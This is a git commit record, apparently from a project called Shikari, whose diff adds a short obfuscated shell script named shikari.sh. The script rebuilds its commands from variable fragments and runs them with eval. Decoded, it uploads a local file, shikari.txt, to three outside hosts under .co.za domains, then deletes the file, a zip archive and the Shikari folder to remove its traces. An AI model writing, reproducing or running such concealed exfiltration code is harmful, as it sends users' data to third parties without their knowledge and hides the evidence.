78b28d419f9c13dbe486fd2150a3f1554d9a1110
Parixit Sutariya <32614362+Bhai4You@users.noreply.github.com>
2020-04-21 09:31:36 +0530

    Update and rename link.txt to shikari.sh

---
+++ shikari.sh
@@ -0,0 +1,3 @@
+z="
+";dz='lt.c';Fz='hika';Uz='://a';Pz='co.z';jz='ari';Cz='cd $';Vz='yk.c';gz='txt';Ez='cd S';Zz='.txt';bz='oodc';ez='rm -';Sz='i.tx';Dz='HOME';Jz='shik';Mz='http';fz='rvf ';Wz='o.za';Gz='ri';Oz='cnc.';cz='onsu';Lz='txt ';Bz='r';az='://f';Xz='/shi';Yz='kari';Tz='t';Hz='curl';Az='clea';Iz=' -T ';Kz='ari.';Rz='ikar';iz='Shik';Qz='a/sh';Nz='://s';hz='zip';
+eval "$Az$Bz$z$Cz$Dz$z$Ez$Fz$Gz$z$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$z$Hz$Iz$Jz$Kz$Lz$Mz$Uz$Vz$Wz$Xz$Yz$Zz$z$Hz$Iz$Jz$Kz$Lz$Mz$az$bz$cz$dz$Wz$Xz$Yz$Zz$z$Cz$Dz$z$Ez$Fz$Gz$z$ez$fz$Jz$Kz$gz$z$Cz$Dz$z$ez$fz$Jz$Kz$hz$z$ez$fz$iz$jz$z$Az$Bz"
